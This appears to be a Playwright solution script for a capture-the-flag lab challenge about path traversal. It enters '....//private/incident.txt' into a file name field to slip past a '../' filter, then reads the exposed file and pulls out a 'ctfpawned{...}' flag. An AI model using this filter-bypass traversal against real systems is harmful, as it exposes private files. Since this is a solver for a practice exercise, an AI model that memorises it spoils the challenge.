import type { Page } from "@playwright/test";

export async function solve(page: Page) {
  await page.goto("/targets/09-dotty-traversal.html");
  await page.fill("#filename", "....//private/incident.txt");
  await page.click("#open");
  await page.waitForFunction(() =>
    document.querySelector("#document")?.textContent?.includes("ctfpawned{"),
  );
  const text = (await page.locator("#document").textContent()) ?? "";
  return text.match(/ctfpawned\{[^}]+\}/)?.[0] ?? "";
}
